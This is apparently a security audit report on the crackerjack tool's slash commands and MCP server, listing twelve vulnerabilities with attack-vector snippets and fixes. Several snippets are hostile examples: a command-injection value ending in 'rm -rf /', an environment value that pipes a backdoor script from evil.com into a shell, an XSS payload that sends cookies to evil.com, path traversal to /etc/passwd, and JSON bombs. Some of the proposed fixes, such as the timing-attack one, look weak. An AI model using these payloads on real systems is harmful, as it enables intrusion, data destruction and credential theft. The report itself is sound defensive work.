# Crackerjack Security Audit Report

**Slash Commands & MCP Infrastructure**

## Executive Summary

This comprehensive security audit identified **12 significant vulnerabilities** across the crackerjack slash command infrastructure, ranging from **Critical** to **Medium** severity. The audit focuses on the `/crackerjack:run` and `/crackerjack:init` commands, MCP server tools, WebSocket endpoints, and supporting infrastructure.

### Risk Distribution

- **Critical**: 3 vulnerabilities (command injection, path traversal, privilege escalation)
- **High**: 4 vulnerabilities (authentication bypass, information disclosure)
- **Medium**: 5 vulnerabilities (resource exhaustion, validation bypass)

______________________________________________________________________

## Critical Vulnerabilities

### 🔴 CRITICAL-001: Command Injection in Initialization Service

**File**: `crackerjack/services/initialization.py`
**Lines**: 232-241, 307-322
**CVSS Score**: 9.8

**Description**: The `check_uv_installed()` method executes subprocess commands without proper input validation, and the initialization workflow processes user-controlled project names that are substituted into system commands.

**Attack Vector**:

```python
# In initialization workflow
project_name = "../../../etc/passwd; rm -rf /"
# Gets processed through _read_and_process_content()
# and _replace_project_name_in_config_value()
```

**Impact**:

- Remote code execution on the host system
- Complete system compromise via malicious project names
- File system manipulation through path injection

**Mitigation**:

```python
def check_uv_installed(self) -> bool:
    try:
        # SECURE: Use shutil.which() instead of subprocess
        import shutil

        return shutil.which("uv") is not None
    except Exception:
        return False


def _validate_project_name(self, project_name: str) -> str:
    # Add strict validation
    import re

    if not re.match(r"^[a-zA-Z0-9_-]+$", project_name):
        raise SecurityError("Invalid project name format")
    if len(project_name) > 50:
        raise SecurityError("Project name too long")
    return project_name
```

### 🔴 CRITICAL-002: Path Traversal in MCP Context

**File**: `crackerjack/mcp/context.py`
**Lines**: 511-516, 245-254

**Description**: The `create_progress_file_path()` method has insufficient validation allowing directory traversal attacks, and `validate_job_id()` regex validation can be bypassed.

**Attack Vector**:

```python
# Bypass job_id validation
job_id = "valid_name/../../../etc/passwd"
# The regex only checks character classes but allows path separators
# Path creation: progress_dir / f"job-{job_id}.json"
# Results in: /tmp/crackerjack-mcp-progress/job-valid_name/../../../etc/passwd.json
```

**Impact**:

- Arbitrary file read/write outside intended directories
- Access to sensitive system files
- Configuration file manipulation

**Mitigation**:

```python
def validate_job_id(self, job_id: str) -> bool:
    if not job_id or len(job_id) > 64:
        return False

    # SECURE: Strict validation
    if not re.match(r"^[a-zA-Z0-9_-]{1,64}$", job_id):
        return False

    # SECURE: Explicit path traversal prevention
    if any(dangerous in job_id for dangerous in ["..", "/", "\\", "~"]):
        return False

    # SECURE: Use resolve() to check final path
    final_path = self.progress_dir / f"job-{job_id}.json"
    try:
        resolved = final_path.resolve()
        return resolved.parent == self.progress_dir.resolve()
    except OSError:
        return False
```

### 🔴 CRITICAL-003: Privilege Escalation via WebSocket Server Process

**File**: `crackerjack/mcp/context.py`
**Lines**: 307-322

**Description**: The WebSocket server spawning mechanism can be exploited to execute arbitrary commands with elevated privileges.

**Attack Vector**:

```python
# Manipulate environment to control subprocess execution
import os

os.environ["CRACKERJACK_WEBSOCKET_PORT"] = (
    "8675; /bin/sh -c 'curl http://evil.com/backdoor.sh | sh'"
)

# The subprocess.Popen call becomes:
# [sys.executable, "-m", "crackerjack", "--start-websocket-server", "--websocket-port", "8675; /bin/sh -c ..."]
```

**Impact**:

- Arbitrary command execution during server startup
- Potential privilege escalation if MCP server runs with elevated privileges
- System compromise through environment manipulation

**Mitigation**:

```python
async def _spawn_websocket_process(self) -> None:
    import sys

    # SECURE: Validate port number
    try:
        port_num = int(self.websocket_server_port)
        if not (1024 <= port_num <= 65535):
            raise ValueError("Port out of range")
    except ValueError as e:
        raise SecurityError(f"Invalid WebSocket port: {e}")

    # SECURE: Use validated port string
    port_str = str(port_num)

    self.websocket_server_process = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "crackerjack",
            "--start-websocket-server",
            "--websocket-port",
            port_str,  # Validated input
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
        # SECURE: Clean environment
        env=self._create_secure_subprocess_env(),
    )
```

______________________________________________________________________

## High Vulnerabilities

### 🟠 HIGH-001: Authentication Bypass in MCP Tools

**File**: `crackerjack/mcp/tools/execution_tools.py`
**Lines**: 102-121

**Description**: Rate limiting validation can be bypassed through exception handling, allowing unlimited execution of expensive operations.

**Attack Vector**:

```python
# Rate limiter check uses suppress(Exception)
# Any exception in rate limiter bypasses all limits
context.rate_limiter = MaliciousRateLimiter()  # Throws exception
# Result: No rate limiting applied, unlimited execution
```

**Impact**:

- Resource exhaustion attacks
- Denial of service through rapid command execution
- Bypass of security controls

**Mitigation**:

```python
async def _validate_context_and_rate_limit(context: t.Any) -> str | None:
    if not context:
        return json.dumps({"status": "error", "message": "MCP context not available"})

    if hasattr(context, "rate_limiter") and context.rate_limiter:
        try:
            allowed, details = await context.rate_limiter.check_request_allowed(
                "execute_crackerjack"
            )
            if not allowed:
                return json.dumps(
                    {
                        "status": "error",
                        "message": f"Rate limit exceeded: {details}",
                    }
                )
        except Exception as e:
            # SECURE: Log and deny on rate limiter errors
            logger.warning(f"Rate limiter error, denying request: {e}")
            return json.dumps(
                {"status": "error", "message": "Rate limiting service unavailable"}
            )

    return None
```

### 🟠 HIGH-002: Information Disclosure in Error Messages

**File**: `crackerjack/mcp/tools/workflow_executor.py`
**Lines**: 16-28

**Description**: Full stack traces and system paths are exposed in error responses, revealing internal system architecture.

**Attack Vector**:

```python
# Trigger exception to get full traceback
error_details = traceback.format_exc()
return {
    "traceback": error_details,  # Reveals full file paths, internal structure
    "error": f"Execution failed: {e}",  # May contain sensitive data
}
```

**Impact**:

- System architecture disclosure
- File path enumeration
- Internal implementation details exposure
- Aid in further attack planning

**Mitigation**:

```python
async def execute_crackerjack_workflow(
    args: str, kwargs: dict[str, t.Any]
) -> dict[str, t.Any]:
    job_id = str(uuid.uuid4())[:8]

    try:
        return await _execute_crackerjack_sync(job_id, args, kwargs, get_context())
    except Exception as e:
        # SECURE: Log full details internally, return sanitized error
        logger.error(f"Workflow execution failed: {traceback.format_exc()}")

        return {
            "job_id": job_id,
            "status": "failed",
            "error": "Execution failed due to internal error",  # Generic message
            "error_id": job_id,  # Reference for support
            "timestamp": time.time(),
        }
```

### 🟠 HIGH-003: Insecure WebSocket HTML Injection

**File**: `crackerjack/mcp/websocket/endpoints.py`
**Lines**: 50-492, 540-547

**Description**: The test page HTML contains XSS vulnerabilities and the job monitor endpoint reflects user input without sanitization.

**Attack Vector**:

```python
# XSS via job_id parameter
job_id = "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"

# Gets directly injected into HTML:
# f"<title>Job Monitor-{job_id}</title>"
# f"<span class=\"job-id\">{job_id}</span>"
```

**Impact**:

- Cross-site scripting (XSS) attacks
- Session hijacking via cookie theft
- Malicious JavaScript execution in browser contexts
- Client-side security bypass

**Mitigation**:

```python
def _get_monitor_html(job_id: str) -> str:
    import html

    # SECURE: HTML escape user input
    safe_job_id = html.escape(job_id)

    # Validate job_id format
    if not re.match(r"^[a-zA-Z0-9_-]{1,64}$", job_id):
        return "<h1>Error</h1><p>Invalid job ID format</p>"

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Job Monitor - {safe_job_id}</title>
        <!-- CSP header -->
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'">
    </head>
    <body>
        <span class="job-id">{safe_job_id}</span>
        <script>
            const jobId = {json.dumps(job_id)};  // Safe JSON encoding
        </script>
    </body>
    </html>
    """
```

### 🟠 HIGH-004: Unvalidated File Operations in Initialization

**File**: `crackerjack/services/initialization.py`
**Lines**: 86-138

**Description**: File paths from user input are processed without sufficient validation, allowing arbitrary file read/write operations.

**Attack Vector**:

```python
# Malicious source file path
source_file = Path("../../../etc/passwd")
target_file = Path("./innocent_file.txt")

# Process bypasses validation and reads/writes arbitrary files
content = source_file.read_text()  # Reads /etc/passwd
target_file.write_text(content)  # Writes password file to project
```

**Impact**:

- Arbitrary file system access
- Information disclosure through file read
- Data corruption through unauthorized writes
- Configuration manipulation

**Mitigation**:

```python
def _process_config_file(
    self,
    file_name: str,
    merge_strategy: str,
    project_name: str,
    target_path: Path,
    force: bool,
    results: dict[str, t.Any],
) -> None:
    # SECURE: Validate all paths against base directory
    base_dir = self.pkg_path.parent.resolve()
    target_base = target_path.resolve()

    source_file = SecurePathValidator.validate_file_path(base_dir / file_name, base_dir)
    target_file = SecurePathValidator.validate_file_path(
        target_path / file_name, target_base
    )

    # Continue with secure processing...
```

______________________________________________________________________

## Medium Vulnerabilities

### 🟡 MEDIUM-001: Resource Exhaustion via Progress Queue

**File**: `crackerjack/mcp/context.py`
**Lines**: 141-143

**Description**: The progress queue has a fixed maximum size that can be exhausted by rapid job creation.

**Attack Vector**:

```python
# Spawn 1000+ concurrent jobs to fill queue
for i in range(1001):
    context.progress_queue.put_nowait({"job_id": f"spam_{i}", "data": "x" * 10000})
# Queue becomes full, legitimate progress updates fail
```

**Impact**:

- Denial of service for legitimate users
- Progress tracking system failure
- Memory exhaustion on server

**Mitigation**:

```python
# SECURE: Implement queue with user limits and cleanup
class ProgressQueueManager:
    def __init__(self):
        self.user_queues = {}
        self.max_per_user = 10
        self.global_max = 100

    async def add_progress(self, user_id: str, progress_data: dict):
        if user_id not in self.user_queues:
            self.user_queues[user_id] = asyncio.Queue(maxsize=self.max_per_user)

        user_queue = self.user_queues[user_id]
        if user_queue.full():
            # Remove oldest entry
            try:
                await asyncio.wait_for(user_queue.get(), timeout=0.1)
            except asyncio.TimeoutError:
                pass

        await user_queue.put(progress_data)
```

### 🟡 MEDIUM-002: Timing Attack in Token Validation

**File**: `crackerjack/services/security.py`
**Lines**: 128-137

**Description**: String comparison in token validation is vulnerable to timing attacks for token enumeration.

**Attack Vector**:

```python
# Measure response time for different token prefixes
import time

tokens = ["pypi-a", "pypi-b", "pypi-c", ...]
for token in tokens:
    start = time.time()
    validate_token_format(token, "pypi")
    duration = time.time() - start
    # Shorter duration indicates early failure, longer indicates more matching characters
```

**Impact**:

- Token enumeration through timing analysis
- Brute force attack optimization
- Cryptographic oracle attacks

**Mitigation**:

```python
def validate_token_format(self, token: str, token_type: str | None = None) -> bool:
    import hmac

    if not token:
        return False
    if len(token) < 8:
        return False

    # SECURE: Constant-time comparison
    is_valid = len(token) >= 16 and not token.isspace()

    if token_type and token_type.lower() == "pypi":
        expected = token.startswith("pypi-") and len(token) >= 16
        is_valid = is_valid and expected
    elif token_type and token_type.lower() == "github":
        expected = token.startswith("ghp_") and len(token) == 40
        is_valid = is_valid and expected

    # Always perform all checks to prevent timing attacks
    return is_valid
```

### 🟡 MEDIUM-003: Weak Process Termination Handling

**File**: `crackerjack/mcp/context.py`
**Lines**: 401-434

**Description**: WebSocket process termination uses predictable timeouts and insufficient cleanup verification.

**Attack Vector**:

```python
# Process can survive termination attempts
# Timeout periods are fixed and predictable
# Zombie processes can accumulate and consume resources
```

**Impact**:

- Resource exhaustion through zombie processes
- Incomplete cleanup leaving security vulnerabilities
- Process spawning amplification attacks

**Mitigation**:

```python
async def _terminate_live_websocket_process(self) -> None:
    if self.console:
        self.console.print("🛑 Stopping WebSocket server...")

    self.websocket_server_process.terminate()

    # SECURE: Random timeout to prevent timing attacks
    import random

    timeout = random.uniform(3, 7)

    if await self._wait_for_graceful_termination(timeout):
        return

    # SECURE: Verify process is actually terminated
    await self._force_kill_and_verify()


async def _force_kill_and_verify(self) -> None:
    self.websocket_server_process.kill()

    max_attempts = 5
    for attempt in range(max_attempts):
        try:
            self.websocket_server_process.wait(timeout=1)
            break
        except subprocess.TimeoutExpired:
            if attempt == max_attempts - 1:
                # Log security incident - unkillable process
                logger.error(
                    f"Process {self.websocket_server_process.pid} survived kill attempt"
                )
            await asyncio.sleep(0.5)
```

### 🟡 MEDIUM-004: Insufficient Input Validation in Core Tools

**File**: `crackerjack/mcp/tools/core_tools.py`
**Lines**: 46-62

**Description**: JSON parsing and stage validation accept overly broad input without size limits or deep validation.

**Attack Vector**:

```python
# JSON bomb attack
kwargs = '{"a":' + '"x"' * 1000000 + "}"  # Massive JSON payload
# Or deeply nested JSON to exhaust parser
kwargs = '{"a":{"b":{"c":' * 10000 + "{}" + "}}" * 10000
```

**Impact**:

- Memory exhaustion through malicious JSON
- Parser exploitation via deeply nested structures
- Denial of service through resource consumption

**Mitigation**:

```python
def _parse_stage_args(args: str, kwargs: str) -> tuple[str, dict] | str:
    stage = args.strip().lower()
    valid_stages = {"fast", "comprehensive", "tests", "cleaning", "init"}

    if stage not in valid_stages:
        return f'{{"error": "Invalid stage: {stage}. Valid stages: {valid_stages}", "success": false}}'

    # SECURE: Limit input size
    if len(kwargs) > 10000:  # 10KB limit
        return '{"error": "Input too large", "success": false}'

    extra_kwargs = {}
    if kwargs.strip():
        try:
            # SECURE: Limited JSON parsing
            import json

            extra_kwargs = json.loads(
                kwargs,
                object_hook=None,  # Prevent custom objects
                parse_float=float,  # Prevent Decimal DoS
                parse_int=int,  # Prevent large int DoS
                parse_constant=lambda x: None,
            )  # Prevent infinity/nan

            # SECURE: Limit nested depth
            if _get_json_depth(extra_kwargs) > 5:
                return '{"error": "JSON too deeply nested", "success": false}'

        except json.JSONDecodeError as e:
            return f'{{"error": "Invalid JSON in kwargs: {e}", "success": false}}'

    return stage, extra_kwargs


def _get_json_depth(obj, current_depth=0):
    if current_depth > 10:  # Prevent stack overflow
        return current_depth
    if isinstance(obj, dict):
        return max(
            [_get_json_depth(v, current_depth + 1) for v in obj.values()]
            + [current_depth]
        )
    elif isinstance(obj, list):
        return max(
            [_get_json_depth(item, current_depth + 1) for item in obj] + [current_depth]
        )
    return current_depth
```

### 🟡 MEDIUM-005: Unsafe Temporary File Creation

**File**: `crackerjack/mcp/context.py`
**Lines**: 138-140

**Description**: Progress directory creation uses predictable paths in system temp directory without proper permission verification.

**Attack Vector**:

```python
# Race condition attack on temp directory creation
# /tmp/crackerjack-mcp-progress is predictable
# Attacker can pre-create with different permissions
# or symlink to sensitive location
```

**Impact**:

- Race condition attacks on directory creation
- Information disclosure through predictable paths
- Permission escalation through symlink attacks

**Mitigation**:

```python
def __init__(self, config: MCPServerConfig) -> None:
    self.config = config

    # SECURE: Use secure temporary directory
    if config.progress_dir:
        self.progress_dir = config.progress_dir
    else:
        import tempfile
        import secrets

        # Generate cryptographically secure directory name
        secure_suffix = secrets.token_hex(8)
        self.progress_dir = (
            Path(tempfile.gettempdir()) / f"crackerjack-mcp-{secure_suffix}"
        )

    # SECURE: Ensure proper permissions
    self.progress_dir.mkdir(
        mode=0o700, exist_ok=False
    )  # Exclusive creation, owner-only
```

______________________________________________________________________

## Security Recommendations

### Immediate Actions (Critical Priority)

1. **Deploy input validation** for all user-controlled data paths
1. **Implement command injection prevention** in initialization service
1. **Add path traversal protection** with proper canonicalization
1. **Secure WebSocket process spawning** with environment sanitization

### Authentication & Authorization

1. **Implement proper authentication** for MCP server access
1. **Add role-based access control** for different tool categories
1. **Deploy session management** with secure token handling
1. **Rate limiting** with user-specific quotas

### Input Validation Framework

```python
class SecurityValidator:
    @staticmethod
    def validate_job_id(job_id: str) -> str:
        if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', job_id):
            raise SecurityError("Invalid job ID format")
        return job_id

    @staticmethod
    def validate_json_input(json_str: str, max_size: int = 10000) -> dict:
        if len(json_str) > max_size:
            raise SecurityError("Input too large")
        # Additional parsing security...

    @staticmethod
    def validate_file_path(path: str, base_dir: str) -> Path:
        # Comprehensive path validation...
```

### Security Headers & CSP

```python
security_headers = {
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'",
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
}
```

### Monitoring & Logging

1. **Security event logging** for all authentication attempts
1. **Anomaly detection** for unusual API usage patterns
1. **File access monitoring** for unauthorized access attempts
1. **Performance monitoring** to detect DoS attacks

______________________________________________________________________

## Compliance & Standards

This audit follows OWASP Top 10 2021 guidelines:

- **A01 Broken Access Control** - Path traversal, authentication bypass
- **A03 Injection** - Command injection, XSS
- **A05 Security Misconfiguration** - Insecure defaults, error disclosure
- **A06 Vulnerable Components** - Subprocess execution, JSON parsing
- **A09 Security Logging** - Insufficient monitoring

**Tools Used**: Manual code review, static analysis patterns, threat modeling

**Next Review**: Recommended every 6 months or after major releases
